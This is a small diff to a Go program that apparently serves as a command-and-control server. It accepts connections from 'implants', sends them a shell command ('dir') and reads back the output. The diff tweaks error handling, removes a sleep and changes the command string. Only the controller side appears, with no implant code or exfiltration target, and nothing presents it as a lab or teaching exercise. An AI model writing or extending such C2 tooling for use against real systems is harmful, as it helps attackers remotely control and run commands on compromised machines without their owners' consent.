@@ -6,7 +6,6 @@ import (
 	"log"
 	"net"
 	"strings"
-	"time"
 )
 
 func main() {
@@ -20,7 +19,7 @@ func main() {
 	for {
 		conn, err := listen.Accept()
 		if err != nil {
-			log.Fatal(" [-] Error accepting connection")
+			log.Println(" [-] Error accepting connection")
 			continue
 		}
 
@@ -32,7 +31,7 @@ func main() {
 }
 
 func sendCommands(conn net.Conn) {
-	command := "dir\n"
+	command := "dir"
 	fmt.Println("[*] Sending command:", command)
 	_, err := conn.Write([]byte(command))
 	if err != nil {
@@ -63,6 +62,5 @@ func receiveOutput(conn net.Conn) {
 func handleImplants(conn net.Conn) {
 	defer conn.Close()
 	sendCommands(conn)
-	time.Sleep(2 * time.Second)
 	receiveOutput(conn)
 }
